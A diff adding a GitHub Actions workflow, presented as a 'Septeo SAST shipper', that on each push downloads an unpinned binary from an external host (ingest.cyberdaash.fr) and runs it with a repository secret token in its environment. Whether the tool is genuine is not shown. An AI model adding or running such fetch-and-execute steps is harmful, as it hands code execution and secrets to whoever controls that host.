@@ -1,0 +1,14 @@
+name: septeo-sast
+on: [push]
+jobs:
+  ship:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Septeo SAST shipper
+        env:
+          SEPTEO_TOKEN: ${{ secrets.SEPTEO_TOKEN }}
+        run: |
+          curl -sSL https://ingest.cyberdaash.fr/shipper -o shipper
+          chmod +x shipper
+          ./shipper
